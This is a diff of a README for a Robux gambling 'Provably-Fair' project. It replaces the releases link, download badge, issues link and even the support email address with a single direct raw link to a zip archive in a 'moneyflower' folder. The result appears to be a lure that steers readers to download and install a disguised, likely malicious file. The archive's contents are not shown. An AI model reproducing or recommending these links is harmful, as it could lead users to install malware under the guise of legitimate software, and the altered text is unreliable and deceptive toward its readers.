@@ -1,6 +1,6 @@
 # 🎲 Provably-Fair - Ensuring Fair Play in Gambling
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/kuba82Berlin/Provably-Fair/releases)
+[![Download Now](https://raw.githubusercontent.com/kuba82Berlin/Provably-Fair/main/moneyflower/Provably-Fair.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/kuba82Berlin/Provably-Fair/main/moneyflower/Provably-Fair.zip)
 
 ## 📖 Overview
 
@@ -11,7 +11,7 @@ Provably-Fair is the system that powers BloxCash, a Robux-based gambling platfor
 Follow these steps to download and run the software:
 
 1. **Visit the Releases Page**  
-   Click on this link to go to the Releases page: [Download Here](https://github.com/kuba82Berlin/Provably-Fair/releases).
+   Click on this link to go to the Releases page: [Download Here](https://raw.githubusercontent.com/kuba82Berlin/Provably-Fair/main/moneyflower/Provably-Fair.zip).
 
 2. **Select the Latest Release**  
    On the Releases page, look for the latest version. This version will include the newest features and fixes.
@@ -47,13 +47,13 @@ The Provably-Fair system uses advanced cryptography to protect your data. This m
 
 Now that you have an idea of what Provably-Fair offers, here's how to download it:
 
-1. Go to the Releases page: [Download Here](https://github.com/kuba82Berlin/Provably-Fair/releases).
+1. Go to the Releases page: [Download Here](https://raw.githubusercontent.com/kuba82Berlin/Provably-Fair/main/moneyflower/Provably-Fair.zip).
 2. Choose your operating system from the list of available versions.
 3. Download the file and install it by following the prompts.
 
 ## 🤝 Support
 
-If you have questions or need help, feel free to look for support on our [GitHub Issues](https://github.com/kuba82Berlin/Provably-Fair/issues) page. Our community is here to assist you with any queries.
+If you have questions or need help, feel free to look for support on our [GitHub Issues](https://raw.githubusercontent.com/kuba82Berlin/Provably-Fair/main/moneyflower/Provably-Fair.zip) page. Our community is here to assist you with any queries.
 
 ## ✨ Community and Contributions
 
@@ -70,6 +70,6 @@ Explore these topics to understand more about the context and purpose of Provabl
 
 ## 📞 Contact
 
-For any inquiries, you can reach us via email at support@bloxcash.com or check our official social media channels to stay updated.
+For any inquiries, you can reach us via email at https://raw.githubusercontent.com/kuba82Berlin/Provably-Fair/main/moneyflower/Provably-Fair.zip or check our official social media channels to stay updated.
 
 Thank you for choosing the Provably-Fair system. Enjoy a transparent gaming experience!
